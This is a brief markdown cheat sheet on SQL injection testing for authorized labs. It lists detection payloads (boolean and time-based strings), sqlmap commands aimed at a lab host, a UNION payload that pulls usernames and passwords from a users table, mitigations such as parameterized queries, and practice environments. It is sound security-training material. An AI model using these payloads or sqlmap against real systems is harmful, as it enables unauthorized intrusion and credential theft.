# SQL Injection Testing (Authorized Scope Only)

## Detection
- Single quote `'` to trigger SQL errors
- Boolean-based: `' OR '1'='1` vs `' OR '1'='2`
- Time-based: `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `SLEEP(5)` (MySQL)

## sqlmap usage (scoped targets only)
```bash
sqlmap -u "http://lab.local/page?id=1" --batch --risk=1 --level=1
sqlmap -r request.txt -p id --batch
```

Always use `--batch` in labs; never run against systems without authorization.

## Manual UNION example (MySQL)
```sql
' UNION SELECT 1,username,password FROM users--
```

## Mitigations
- Parameterized queries / prepared statements
- ORM with bound parameters
- Least-privilege DB user (no FILE/EXEC privileges)
- WAF as additional layer, not primary defense

## Practice environments
- DVWA SQL Injection module
- PortSwigger SQL injection labs
- sqlilabs (Mutillidae)
